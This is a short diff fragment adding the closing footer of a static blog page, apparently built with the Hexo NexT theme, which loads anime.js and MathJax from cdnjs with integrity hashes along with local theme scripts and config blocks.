+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">false</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
